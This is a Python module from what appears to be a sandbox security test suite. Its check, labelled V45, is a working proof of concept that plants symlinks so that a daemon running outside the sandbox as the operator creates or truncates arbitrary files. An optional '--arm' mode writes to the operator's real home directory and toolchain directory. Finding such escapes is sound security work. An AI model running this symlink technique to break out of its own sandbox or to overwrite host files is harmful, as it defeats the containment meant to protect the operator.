"""V45 - the daemon's answer sweep writes any path a symlink names, as the operator.

The session loop polls ``<state_dir>/recalls`` every ``POLL_MS`` and answers
each ``*.request`` it finds: read the request, unlink it, open
``<id>.answer.writing`` with write+create+truncate at mode 0600, write the
rendered answer, rename it to ``<id>.answer``. Both names come from the
request filename, which this process chooses, and the open carries no
``O_NOFOLLOW`` (errand ``src/session/recalling.rs``, scheduled from
``session.rs``).

The sweep runs in the daemon, outside this sandbox, as the operator's uid. A
symlink planted at ``<id>.answer.writing`` therefore makes the daemon create
or truncate whatever it names, with no sandbox rule in the way.

Three targets go into one sweep, all named by the state dir's *host* path,
because the daemon's mount namespace has no ``/state``:

  a. a file this process never writes: the answer format
     (``Nothing recorded matches ...``) is the only writer of it
  b. the same file a second time: the second answer truncates the first,
     which is the overwrite half of the primitive
  c. a path whose parent does not exist: it must produce no answer, so the
     rename oracle separates "the write happened" from "the sweep renames
     whatever it finds"

Controls: a sibling file this process writes directly, so a working
filesystem is not the explanation, and a path this process is denied
(``state/home/bin``, a read-only mount) to record what a direct write gets.

``--arm`` adds two irreversible targets: the operator's home root and the
toolchain directory the sandbox gets EROFS on. Neither can be removed from
inside the sandbox, so they are only written when asked for, and cleanup
reports them by name instead of pretending to remove them.
"""
import json
import os
import re
import time
import uuid

try:
    from sandeval.base import Result, Status, Vector, errno_name
except ImportError:
    from base import Result, Status, Vector, errno_name  # type: ignore

BIND = re.compile(r"\{\s*path\s*=\s*\"([^\"]+)\"\s*,\s*at\s*=\s*\"([^\"]+)\"\s*,?\s*\}")
RECALL_DIR = "recalls"
HOME_ROOT = "/home/qaidvoid"
TOOLCHAIN_TARGET = HOME_ROOT + "/.local/share/cargo/bin/SANDEVAL-POC.txt"
SETTLE_SECONDS = 0.6
POLL_TIMEOUT = 15.0


def _host_of(policy_text, sandbox_path):
    """The host path behind a sandbox bind, from the policy's own alias list."""
    for host, at in BIND.findall(policy_text or ""):
        if at == sandbox_path:
            return host
    return ""


def _plant(directory, ident, target, query):
    """One request plus the symlink the daemon will open instead of a file."""
    link = os.path.join(directory, f"{ident}.answer.writing")
    request = os.path.join(directory, f"{ident}.request")
    for stale in (link, os.path.join(directory, f"{ident}.answer"), request):
        try:
            os.unlink(stale)
        except OSError:
            pass
    os.symlink(target, link)
    with open(request, "w") as handle:
        json.dump({"query": query}, handle)


def _answered(directory, ident):
    return os.path.lexists(os.path.join(directory, f"{ident}.answer"))


def _wait(directory, ident, timeout=POLL_TIMEOUT):
    """True once the daemon has taken the request and written its answer."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        if _answered(directory, ident):
            return True
        request = os.path.join(directory, f"{ident}.request")
        if not os.path.exists(request):
            time.sleep(SETTLE_SECONDS)
            return _answered(directory, ident)
        time.sleep(0.2)
    return _answered(directory, ident)


def _read(path):
    try:
        with open(path, encoding="utf-8", errors="replace") as handle:
            return handle.read(), ""
    except OSError as exc:
        return "", errno_name(exc)


class DaemonAnswerWriteVector(Vector):
    id = "V45"
    title = "the daemon's answer sweep creates or truncates any path a symlink names, as the operator"
    severity = "ship-blocker"
    maps_to = "P3 / P12"
    description = __doc__
    host_verify = "host shell: test -f /home/qaidvoid/POC.txt (written only with --arm)"

    def check(self, ctx):
        state = (ctx.state_dir or "/state").rstrip("/")
        recalls = os.path.join(state, RECALL_DIR)
        host_state = _host_of(ctx._policy_text(), state)
        nonce = uuid.uuid4().hex[:8]
        detail = {
            "state_dir": state,
            "host_state": host_state,
            "controls": {},
            "targets": {},
            "armed": {},
        }

        if not host_state:
            return Result(
                Status.SKIP,
                "the policy names no host path for the state dir, so a daemon "
                "write cannot be aimed at anything observable",
                detail,
            )
        try:
            os.makedirs(recalls, exist_ok=True)
        except OSError as exc:
            return Result(
                Status.SKIP,
                f"cannot open the exchange directory {recalls}: {errno_name(exc)}",
                detail,
            )

        direct = os.path.join(state, "v45-direct.txt")
        try:
            with open(direct, "w") as handle:
                handle.write(f"sandeval-v45 direct control {nonce}\n")
            detail["controls"]["direct_write"] = "ok"
        except OSError as exc:
            detail["controls"]["direct_write"] = errno_name(exc)

        denied = os.path.join(state, "home", "bin", "v45-denied.txt")
        try:
            with open(denied, "w") as handle:
                handle.write("the sandbox must not reach this mount\n")
            os.unlink(denied)
            detail["controls"]["denied_path"] = "writable (a refusal was expected)"
        except OSError as exc:
            detail["controls"]["denied_path"] = errno_name(exc)

        target = os.path.join(host_state, "v45-daemon.txt")
        sandbox_target = os.path.join(state, "v45-daemon.txt")
        try:
            os.unlink(sandbox_target)
        except OSError:
            pass

        _plant(recalls, "v45a", target, f"sandeval-v45-create-{nonce}")
        answered_create = _wait(recalls, "v45a")
        text_create, err_create = _read(sandbox_target)
        detail["targets"]["create"] = {
            "target": target,
            "answered": answered_create,
            "visible": err_create == "",
            "error": err_create or None,
            "text": text_create.strip(),
            "written_by_daemon": err_create == ""
            and f"sandeval-v45-create-{nonce}" in text_create
            and not text_create.startswith("sandeval-v45 direct"),
        }

        _plant(recalls, "v45b", target, f"sandeval-v45-overwrite-{nonce}")
        answered_overwrite = _wait(recalls, "v45b")
        text_overwrite, err_overwrite = _read(sandbox_target)
        detail["targets"]["overwrite"] = {
            "answered": answered_overwrite,
            "visible": err_overwrite == "",
            "text": text_overwrite.strip(),
            "changed": err_overwrite == "" and text_overwrite != text_create,
        }

        missing_parent = os.path.join(host_state, "v45-no-such-dir", "poc.txt")
        _plant(recalls, "v45c", missing_parent, f"sandeval-v45-negative-{nonce}")
        answered_negative = _wait(recalls, "v45c")
        detail["targets"]["negative"] = {
            "target": missing_parent,
            "answered": answered_negative,
            "expected": False,
        }

        if ctx.arm:
            for ident, armed_target in (
                ("v45d", HOME_ROOT + "/POC.txt"),
                ("v45e", TOOLCHAIN_TARGET),
            ):
                _plant(recalls, ident, armed_target, f"sandeval-v45-armed-{nonce}")
                answered = _wait(recalls, ident)
                key = "home_root" if ident == "v45d" else "toolchain"
                entry = {"target": armed_target, "answered": answered}
                if key == "toolchain":
                    text, err = _read(armed_target)
                    entry["visible"] = err == ""
                    entry["error"] = err or None
                    entry["text"] = text.strip()
                detail["armed"][key] = entry

        create = detail["targets"]["create"]
        overwrite = detail["targets"]["overwrite"]
        negative = detail["targets"]["negative"]

        if not create["answered"] and not create["visible"]:
            return Result(
                Status.SKIP,
                "no daemon took the planted request, so there is no answer "
                "sweep to measure in this environment",
                detail,
            )

        if not create["written_by_daemon"]:
            if create["answered"] and not create["visible"]:
                return Result(
                    Status.SUSPECTED,
                    "the sweep renamed our symlink but the file is not visible "
                    "under the state bind: the daemon resolves paths in its own "
                    "mount namespace, so the write has to be confirmed on the host",
                    detail,
                )
            return Result(
                Status.SUSPECTED,
                "the sweep answered without writing the planted target, so "
                f"something else explains the file ({create['error']})",
                detail,
            )

        parts = [
            "the daemon's answer sweep created a file this process never wrote, "
            "at a path taken from a request filename it also followed as a "
            "symlink"
        ]
        if overwrite["changed"]:
            parts.append("then truncated it on a second answer")
        else:
            parts.append("and a second answer did not change it, so the "
                         "overwrite half is unproven here")
        if not negative["answered"]:
            parts.append("while a path with no parent produced no answer, so "
                         "the rename oracle distinguishes the two")
        else:
            parts.append("and the negative control answered too, so the rename "
                         "oracle alone would not separate them")
        parts.append(
            "the answer writer therefore performs an arbitrary create and "
            "truncate as the operator's uid: the open carries no O_NOFOLLOW"
        )
        if detail["armed"]:
            named = ", ".join(
                f"{entry['target']} (answered={entry['answered']})"
                for entry in detail["armed"].values()
            )
            parts.append(f". Armed targets written: {named}")
        return Result(Status.FAIL, "; ".join(parts), detail)

    def cleanup(self, ctx):
        state = (ctx.state_dir or "/state").rstrip("/")
        recalls = os.path.join(state, RECALL_DIR)
        removed = []
        for path in (
            os.path.join(state, "v45-direct.txt"),
            os.path.join(state, "v45-daemon.txt"),
            os.path.join(state, "home", "bin", "v45-denied.txt"),
        ):
            try:
                os.unlink(path)
                removed.append(path)
            except OSError:
                pass
        try:
            for name in sorted(os.listdir(recalls)):
                if name.startswith("v45"):
                    try:
                        os.unlink(os.path.join(recalls, name))
                        removed.append(os.path.join(recalls, name))
                    except OSError:
                        pass
        except OSError:
            pass

        unreached = [
            path
            for path in (HOME_ROOT + "/POC.txt", TOOLCHAIN_TARGET)
            if os.path.lexists(path) or ctx.arm
        ]
        note = ""
        if unreached:
            note = (
                "; not removable from inside the sandbox (no delete primitive "
                f"reaches them): {', '.join(unreached)}"
            )
        note += (
            f"; not checkable from inside the sandbox either: {HOME_ROOT}/POC.txt "
            "sits in the real home root, which this namespace does not mount"
        )
        return Result(
            Status.INFO,
            f"removed {len(removed)} file(s){note}",
            {"removed": removed, "unreached": unreached},
        )


VECTOR = DaemonAnswerWriteVector()
